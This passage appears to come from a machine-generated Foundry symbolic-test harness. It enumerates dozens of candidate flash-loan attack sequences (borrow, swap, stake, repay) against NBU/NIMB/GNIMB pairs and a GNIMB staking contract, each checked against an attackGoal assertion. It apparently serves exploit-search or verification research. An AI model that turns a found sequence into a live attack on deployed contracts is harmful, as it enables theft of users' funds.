        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt5 == (amt1 * 1003) / 1000);
        borrow_pairnbugnimb_nimb(amt0);
        borrow_pairnbugnimb_nbu(amt1);
        swap_pairnbunimb_nimb_nbu(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        payback_pairnbugnimb_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4972(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_pairnbugnimb_nimb(amt0);
        borrow_pairnbugnimb_nbu(amt1);
        swap_pairnbunimb_nimb_nbu(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        payback_pairnbugnimb_nbu(amt4);
        swap_pairnbugnimb_gnimb_nbu(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4973(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_nbu(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbugnimb_gnimb_nbu(amt2);
        payback_pairnbugnimb_nbu(amt3);
        swap_pairnbunimb_nbu_nimb(amt4);
        payback_pairnbugnimb_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4974(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_nbu(amt0);
        swap_pairnbugnimb_nbu_gnimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_pairnbugnimb_nbu(amt3);
        swap_pairnbunimb_nbu_nimb(amt4);
        payback_pairnbugnimb_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4975(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_nbu(amt0);
        swap_pairnbugnimb_nbu_gnimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbugnimb_gnimb_nbu(amt3);
        swap_pairnbunimb_nbu_nimb(amt4);
        payback_pairnbugnimb_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4976(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_nbu(amt0);
        swap_pairnbugnimb_nbu_gnimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbugnimb_gnimb_nbu(amt3);
        payback_pairnbugnimb_nbu(amt4);
        payback_pairnbugnimb_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4977(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_nimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbugnimb_gnimb_nbu(amt2);
        payback_pairnbugnimb_nbu(amt3);
        swap_pairnbunimb_nbu_nimb(amt4);
        payback_pairnbugnimb_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4978(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_nimb(amt0);
        swap_pairnbugnimb_nbu_gnimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_pairnbugnimb_nbu(amt3);
        swap_pairnbunimb_nbu_nimb(amt4);
        payback_pairnbugnimb_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4979(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_nimb(amt0);
        swap_pairnbugnimb_nbu_gnimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbugnimb_gnimb_nbu(amt3);
        payback_pairnbugnimb_nbu(amt4);
        payback_pairnbugnimb_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4980(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_nimb(amt0);
        swap_pairnbugnimb_nbu_gnimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbugnimb_gnimb_nbu(amt3);
        payback_pairnbugnimb_nbu(amt4);
        swap_pairnbunimb_nbu_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4981(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_pairnbugnimb_nimb(amt0);
        borrow_pairnbugnimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbugnimb_gnimb_nbu(amt3);
        payback_pairnbugnimb_nbu(amt4);
        payback_pairnbugnimb_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4982(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_pairnbugnimb_nimb(amt0);
        borrow_pairnbugnimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbugnimb_gnimb_nbu(amt3);
        payback_pairnbugnimb_nbu(amt4);
        swap_pairnbunimb_nbu_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4983(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt5 == (amt1 * 1003) / 1000);
        borrow_pairnbugnimb_nimb(amt0);
        borrow_pairnbugnimb_nbu(amt1);
        swap_pairnbugnimb_nbu_gnimb(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        swap_pairnbunimb_nbu_nimb(amt4);
        payback_pairnbugnimb_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4984(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_pairnbugnimb_nimb(amt0);
        borrow_pairnbugnimb_nbu(amt1);
        swap_pairnbugnimb_nbu_gnimb(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        payback_pairnbugnimb_nbu(amt4);
        payback_pairnbugnimb_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4985(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_pairnbugnimb_nimb(amt0);
        borrow_pairnbugnimb_nbu(amt1);
        swap_pairnbugnimb_nbu_gnimb(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        payback_pairnbugnimb_nbu(amt4);
        swap_pairnbunimb_nbu_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4986(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt5 == (amt1 * 1003) / 1000);
        borrow_pairnbugnimb_nimb(amt0);
        borrow_pairnbugnimb_nbu(amt1);
        swap_pairnbugnimb_nbu_gnimb(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        payback_pairnbugnimb_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4987(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt5 == (amt1 * 1003) / 1000);
        borrow_pairnbugnimb_nimb(amt0);
        borrow_pairnbugnimb_nbu(amt1);
        swap_pairnbugnimb_nbu_gnimb(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        payback_pairnbugnimb_nbu(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4988(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_nbu(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbugnimb_gnimb_nbu(amt2);
        swap_pairnbugnimb_gnimb_nbu(amt3);
        swap_pairnbunimb_nbu_nimb(amt4);
        payback_pairnbugnimb_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4989(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_nbu(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbugnimb_gnimb_nbu(amt2);
        payback_pairnbugnimb_nbu(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        payback_pairnbugnimb_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4990(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_nbu(amt0);
        swap_pairnbugnimb_nbu_gnimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_pairnbugnimb_nbu(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        payback_pairnbugnimb_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4991(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_nbu(amt0);
        swap_pairnbugnimb_nbu_gnimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbugnimb_gnimb_nbu(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        payback_pairnbugnimb_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4992(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_nimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbugnimb_gnimb_nbu(amt2);
        payback_pairnbugnimb_nbu(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        payback_pairnbugnimb_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4993(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_nimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbugnimb_gnimb_nbu(amt2);
        payback_pairnbugnimb_nbu(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        swap_pairnbunimb_nbu_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4994(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_nimb(amt0);
        swap_pairnbugnimb_nbu_gnimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_pairnbugnimb_nbu(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        payback_pairnbugnimb_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4995(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_nimb(amt0);
        swap_pairnbugnimb_nbu_gnimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_pairnbugnimb_nbu(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        swap_pairnbunimb_nbu_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4996(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_nimb(amt0);
        swap_pairnbugnimb_nbu_gnimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbugnimb_gnimb_nbu(amt3);
        payback_pairnbugnimb_nbu(amt4);
        swap_pairnbugnimb_gnimb_nbu(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4997(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt5 == (amt1 * 1003) / 1000);
        borrow_pairnbugnimb_nimb(amt0);
        borrow_pairnbugnimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbugnimb_gnimb_nbu(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        payback_pairnbugnimb_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4998(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_pairnbugnimb_nimb(amt0);
        borrow_pairnbugnimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbugnimb_gnimb_nbu(amt3);
        payback_pairnbugnimb_nbu(amt4);
        swap_pairnbugnimb_gnimb_nbu(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4999(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_pairnbugnimb_nimb(amt0);
        borrow_pairnbugnimb_nbu(amt1);
        swap_pairnbugnimb_nbu_gnimb(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        payback_pairnbugnimb_nbu(amt4);
        swap_pairnbugnimb_gnimb_nbu(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand5000(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_nbu(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbugnimb_nbu_gnimb(amt2);
        payback_pairnbugnimb_nbu(amt3);
        swap_pairnbunimb_nbu_nimb(amt4);
        payback_pairnbugnimb_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand5001(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_nbu(amt0);
        swap_pairnbugnimb_gnimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_pairnbugnimb_nbu(amt3);
        swap_pairnbunimb_nbu_nimb(amt4);
        payback_pairnbugnimb_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand5002(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_nbu(amt0);
        swap_pairnbugnimb_gnimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbugnimb_nbu_gnimb(amt3);
        swap_pairnbunimb_nbu_nimb(amt4);
        payback_pairnbugnimb_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand5003(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_nbu(amt0);
        swap_pairnbugnimb_gnimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbugnimb_nbu_gnimb(amt3);
        payback_pairnbugnimb_nbu(amt4);
        payback_pairnbugnimb_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand5004(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_nimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbugnimb_nbu_gnimb(amt2);
        payback_pairnbugnimb_nbu(amt3);
        swap_pairnbunimb_nbu_nimb(amt4);
        payback_pairnbugnimb_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand5005(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_nimb(amt0);
        swap_pairnbugnimb_gnimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_pairnbugnimb_nbu(amt3);
        swap_pairnbunimb_nbu_nimb(amt4);
        payback_pairnbugnimb_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand5006(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_nimb(amt0);
        swap_pairnbugnimb_gnimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbugnimb_nbu_gnimb(amt3);
        payback_pairnbugnimb_nbu(amt4);
        payback_pairnbugnimb_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand5007(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_nimb(amt0);
        swap_pairnbugnimb_gnimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbugnimb_nbu_gnimb(amt3);
        payback_pairnbugnimb_nbu(amt4);
        swap_pairnbunimb_nbu_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand5008(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt5 == (amt1 * 1003) / 1000);
        borrow_pairnbugnimb_nimb(amt0);
        borrow_pairnbugnimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbugnimb_nbu_gnimb(amt3);
        swap_pairnbunimb_nbu_nimb(amt4);
        payback_pairnbugnimb_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand5009(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_pairnbugnimb_nimb(amt0);
        borrow_pairnbugnimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbugnimb_nbu_gnimb(amt3);
        payback_pairnbugnimb_nbu(amt4);
        payback_pairnbugnimb_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand5010(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_pairnbugnimb_nimb(amt0);
        borrow_pairnbugnimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbugnimb_nbu_gnimb(amt3);
        payback_pairnbugnimb_nbu(amt4);
        swap_pairnbunimb_nbu_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand5011(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt5 == (amt1 * 1003) / 1000);
        borrow_pairnbugnimb_nimb(amt0);
        borrow_pairnbugnimb_nbu(amt1);
        swap_pairnbugnimb_gnimb_nbu(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        swap_pairnbunimb_nbu_nimb(amt4);
        payback_pairnbugnimb_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand5012(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_pairnbugnimb_nimb(amt0);
        borrow_pairnbugnimb_nbu(amt1);
        swap_pairnbugnimb_gnimb_nbu(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        payback_pairnbugnimb_nbu(amt4);
        payback_pairnbugnimb_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand5013(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_pairnbugnimb_nimb(amt0);
        borrow_pairnbugnimb_nbu(amt1);
        swap_pairnbugnimb_gnimb_nbu(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        payback_pairnbugnimb_nbu(amt4);
        swap_pairnbunimb_nbu_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand5014(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt5 == (amt1 * 1003) / 1000);
        borrow_pairnbugnimb_nimb(amt0);
        borrow_pairnbugnimb_nbu(amt1);
        swap_pairnbugnimb_gnimb_nbu(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        swap_pairnbugnimb_nbu_gnimb(amt4);
        payback_pairnbugnimb_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand5015(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt5 == (amt1 * 1003) / 1000);
        borrow_pairnbugnimb_nimb(amt0);
        borrow_pairnbugnimb_nbu(amt1);
        swap_pairnbugnimb_gnimb_nbu(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        swap_pairnbugnimb_nbu_gnimb(amt4);
        payback_pairnbugnimb_nbu(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand5016(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_nbu(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbugnimb_nbu_gnimb(amt2);
        swap_pairnbugnimb_gnimb_nbu(amt3);
